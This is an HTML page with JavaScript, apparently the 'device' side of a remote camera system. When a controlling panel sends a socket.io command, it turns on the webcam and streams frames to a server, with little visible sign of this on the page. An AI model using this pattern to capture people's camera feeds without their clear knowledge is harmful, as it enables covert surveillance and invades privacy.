<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Dispositivo</title>
    <style>
        #video {
            width: 320px;
            height: 240px;
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
    <h2 style="display:none;">Dispositivo</h2>
    <video id="video" autoplay muted></video>
    <p id="status"></p>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const video = document.getElementById('video');
        let stream = null;
        let isSendingFrames = false;
        let canvas = document.createElement('canvas');
        let ctx = canvas.getContext('2d');

        // Função para enviar frames da câmera
        function sendCameraFrame() {
            if (!isSendingFrames || !stream) return;

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Converte para JPEG (otimizado para transmissão)
            const frame = canvas.toDataURL('image/jpeg', 0.7); // Qualidade 70%
            socket.emit('frame_ao_vivo', frame);

            // Configura o próximo frame (~30 FPS)
            setTimeout(sendCameraFrame, 33); // ~33ms = 30 FPS
        }

        // Recebe comandos do Painel
        socket.on('executar_comando', async (cmd) => {
            if (cmd === 'ativar_camera' && !stream) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                    video.srcObject = stream;
                    isSendingFrames = true;
                    sendCameraFrame(); // Inicia o streaming
                } catch (err) {
                    console.error("Erro ao acessar câmera:", err);
                }
            }

            if (cmd === 'desativar_camera' && stream) {
                isSendingFrames = false;
                stream.getTracks().forEach(track => track.stop());
                video.srcObject = null;
                stream = null;
            }
        });
    </script>
</body>
</html>
